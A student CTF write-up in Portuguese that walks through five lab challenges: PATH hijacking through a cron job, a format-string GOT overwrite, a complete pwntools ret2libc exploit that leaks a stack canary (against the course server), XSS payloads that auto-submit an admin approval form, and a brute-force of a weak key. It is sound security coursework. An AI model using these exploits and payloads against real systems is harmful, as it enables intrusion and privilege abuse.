# CTF Extras


## British Punctuality

- Primeiro lendo o código no main.c, descobrimos que a flag estava escrita no ficheiro /flags/flag.txt

![codigo main](/images/w5/extra_1.png) 

- Depois, reparámos que o script my_script.sh, exportava as variáveis de ambiente que estivessem no ficheiro /tmp/env, executava o comnado printenv e depois o programa reader.<br/>

![codigo my_script.sh](/images/w5/extra_2.png) 

- Criamos um printenv na pasta /tmp/, com cat /flags/flag.txt, e demos lhe permissões de execução.
- Então criamos o ficheiro env e escrevemos "PATH=/tmp/:$PATH"

![env and printenv](/images/w5/extra_3.png) 

- Depois executamos o script e vimos que não tinhamos permissões para ler a flag
- Reparámos que havia um script no "/etc/cron.d/", que executava o script "/home/flag_reader/my_script.sh" como flag_reader (a cada minuto), portanto tinha permissões para ler a flag.
![cron](/images/w5/extra_4.png) 

- Esperamos que o script executasse e lê-mos a flag do last_log .

![flag](/images/w5/extra_5.png) 

<br>




## Final Format
Ao correr o comando checksec podemos verificar que:
- o RELRO é parcial, o que significa que podemos alterar a GOT
- o programa tem canarios na stack
- a protecao NX está ativa, o que significa que um segmento de memória não pode ser executável e ser permitido escrever ao mesmo tempo.
- o PIE não está ativo, o que significa que os endereços das funções não se alteram em cada execução

![image-1.png](/images/ctf_fs/image-1.png)


Ao analisar o código com o ghidra vericamos que o programa era vulnerável a format string attacks na linha 17.

![image-2.png](/images/ctf_fs/image-2.png)

E que existe uma função chamada old_backdoor, que cria uma shell. Uma vez que não tem PIE, o enderço da função não irá ser alterado a cada execução pelo que será sempre este endereço 0x8049236.

![image-3.png](/images/ctf_fs/image-3.png)


Ao enviar %p, verificamos que os endereços mudam em cada execução o que significa que a aslr está ativa, portanto não conseguimos descobrir o endereço de retorno da função para a conseguir alterar para o endereço do old_backdoor.

![image-4.png](/images/ctf_fs/image-4.png)

Depois, reparamos que os da got são fixos.

![image-5.png](/images/ctf_fs/image-5.png)

No código reparamos que o fflush era chamado depois do scanf, por isso se alterarmos o endereço dele na tabele para executar a backdoor em vez do fflush, ele irá ser chamado antes do programa terminar.


Ao correr o seguinte script reparamos que não funcionava, uma vez que o servidor dava timeout (no computador local funcionava direito)

![image-6.png](/images/ctf_fs/image-6.png)

Por isso tentamos escrever primeiro os 2 primeiros bytes e depois os outros 2 bytes. Uma vez que o numero da direita (0x9236)  era maior que o da esquerda (0x0804), tivemos q dar overflow ,para conseguir escrever o endereco pretendido (0x08049236).
Primeiro escrevemos 4 bytes(AAAA) que vao ser lidos pelo primeiro %x, depois escrevemos o endereco que queremos alterar (do flush na got, 0x804c010), onde vamos escrever os primeiros bytes com o primeiro %n.
Depois escrevemos outra vez 4 bytes(AAAA) que vão ser lidos (e descartados) pelo segundo %x, e escrevemos o endereco do content + 2, para escrever apenas nos 2 bytes a seguir (e não alterarmos os que já escrevemos antes) 

![image-7.png](/images/ctf_fs/image-7.png)

E assim já funcionou 

![image-8.png](/images/ctf_fs/image-8.png)



## Echo

Como diz o enunciado usamos a versão do ubuntu 22.04, senão estes passos não funcionavam.

Primeiro corremos o comando checksec, e verificamos que todas as proteções estavam ativas.

![](/images/echo/1.png)


Analizando o codigo no ghidra, verificamos que o programa tem um buffer overflow na linha 27, uma vez que lê 100 caracteres para um buffer que tem tamanho maximo 20. E na linha a seguir temos um format string, a funcao(FUN_000110e0 corresponde ao printf)

![](/images/echo/2.png)


O que vamos tentar fazer é apartir das funções do libc invocar uma shell, usando system('/bin/shell'). E depois alterar o return address para executar essa função.

### Encontrar return adress

Então para descobir onde está o return address, usamos o gdb, o que está no return address é 0xf7d9c519, que aponta para uma instrução de uma função do libc.

![](/images/echo/3.png)

Agora aproveitando o format string, descobrimos que eram necessário enviar isto %p%p%p%p%p%p%p%p%p%p%p, para encontrar esse endereço.

![](/images/echo/4.png)

Uma vez que são mais do que 20 letras, ele dá overwrite ao canário, pelo que aparece a mensagem.

![](/images/echo/6png)


### Encontrar canário

Para então conseguirmos depois reescrever o return address vamos ter que encontrar o valor do canário antes.
Com a ajuda do gdb descobrimos quantos %p é preciso enviar para encontrar o canário.
Primeiro descobrimos o canário, valor que está no eax

![](/images/echo/7.png)

E depois enviamos %p até ele aparecer.

![](/images/echo/8.png)


### Encontrar endereço do system e de bin/sh

Primeiro para descobrir o endereço do system executamos o seguinte comando. 

![](/images/echo/9.png)

Assim o endereço da função system vai ser Enderço Base do LIBC + 0x00048150.

Para encontrar a string /bin/sh usada para passar como argumento do system executamos o seguinte comando:

![](/images/echo/10.png)

Esse número está em octadecimal, em decimal é 1822965.
Assim o endereço vai ser Enderço Base do LIBC + 1822965.


### Encontrar endereço base do libc
Portanto agora temos que conseguir descobrir o endereço base do libc, e uma vez que as proteções estão todas ativas é um endereço aleatório.
No gdb com o vmmap conseguimos descobrir o enderço base no debugger 0xf7d7b000:

![](/images/echo/11.png)

No debugger este endereço é fixo, mas a correr o programa normalmente não, então temos que encontrar uma forma de o descobrir em runtime.
Uma vez que o return address que descobrimos anteriormente aponta para uma instrucao do libc, podemos encontrar o offset entre essa instrucao e o endereço base, e assim conseguir calcular em runtime.
Offset = 0xf7d9c519 - 0xf7d7b000 = 0x21519.
Assim descobirmos que ao subtrair ao return address 0x21519, encontramos o endereço base.



### Criar o exploit
Já temos todos os dados para criar o exploit.
Enviamos 20 caracteres até chegar ao canario, damos overwrite ao canario, enviamos mais 8 caracteres para chegar ao ret address, enviamos o endereço do system. (Descobrimos estes valores usando o gdb). 
E finalmente enviamos 4 bytes, uma vez que reparamos que o system aceitava como parametro os 4 bytes a seguir ao return address. E colocamos o endereço onde está o "/bin/sh".

```py
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4002)

# encontrar canario
p.recvuntil(b">")
p.sendline(b"e")
p.recvuntil(b"Insert your name (max 20 chars):")
p.sendline("%p%p%p%p%p%p%p%p")

outp = p.recvuntil(b"Insert your message:")
print( "OUT: '",outp,"'\n")
canario = int(outp[64:64+10],16)
print("\n Canario: " , hex(canario), "\n");
p.sendline("mensagem")


# encontrar ret address
p.recvuntil(b">")
p.sendline(b"e")

print(p.recvuntil(b"Insert your name (max 20 chars):"))
p.sendline("%p%p%p%p%p%p%p%p%p%p%p")

outp = p.recvuntil(b"Insert your message:")
p.sendline("mensagem")
print( "OUT: '",outp,"'\n")
ret_addr = outp[91:91+10]
print("\n Ret address: " ,ret_addr, "\n");
system = int(ret_addr,16) - 0x21519 + 0x0048150
print("\n System: " ,hex(system), "\n");

# encontrar /bin/sh
sh = int(ret_addr,16) - 0x21519 + 1822965
print("\n /bin/sh: " ,hex(sh), "\n");

# enviar exploit
p.recvuntil(b">")
p.sendline(b"e")
canario_bytes  =  (canario).to_bytes(4,byteorder='little') 
system_bytes  =  (system).to_bytes(4,byteorder='little') 
sh_byte = (sh).to_bytes(4,byteorder='little') 

print(p.recvuntil(b"Insert your name (max 20 chars):"))

p.sendline(b'A'*20 + canario_bytes + b'AAAAAAAA' + system_bytes + b"AAAA" + sh_byte)

outp = p.recvuntil(b"Insert your message:")

p.sendline("mensagem")

print(p.recv())
p.interactive()
```




## Apply For Flag II

Escrevemos um script na caixa de texto para verificar se era vulnerável a xss.

![](https://i.imgur.com/KW9QF4j.png)
E verificamos que era
![](https://i.imgur.com/exYmHdG.png)

Depois encontramos o botão que servia para o admin nos enviar a flag.

![](https://i.imgur.com/2qsy1WJ.png)

Uma vez que a porta do site de origem é diferente da do site onde se envia o post, se fizermos apenas um script que envia o pedido (usando fetch) o CORS bloqueia como se pode ver a seguir.

```htmlembedded=
<script> fetch("http://ctf-fsi.fe.up.pt:5005//request/4e860dc39ba2a2b06f97508f88194861dad75ebc/approve) ", {method: "POST"})</script>
```
![](https://i.imgur.com/bf3xyOm.png)

Uma forma de contornar isso é criar um form, e submetê-lo.

```htmlembedded=
<form id="flag_form" method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/28682e517d19ba1c197a730cebbb738e484b1fdc/approve" role="form"> <div class="submit"> <input type="submit" id="giveflag" value="Give the flag" > </div> </form> <script> console.log(document.getElementById('flag')); document.getElementById('giveflag').click() </script>
```

![](https://i.imgur.com/ySSonGg.png)




## NumberStation3
Observando o código fornecido, apesar da chave gerada ter 256 bits, de facto só existem 2^16 chaves possíveis, já que é feito um bitwise & com 1 para cada byte, ou seja, cada byte dos 16 que constituem a chave ou é igual a 0 ou é igual a 1. 
![img](images/extras/numberstation3_b.png)

Como tal, é possível testar todas as chaves possíveis (65536) em tempo útil e, para cada uma destas, tentar decifrar o criptograma. Uma destas será a chave verdadeira e o resultado será a mensagem original, ou seja, a flag
![img](images/extras/numberstation3_a.png)








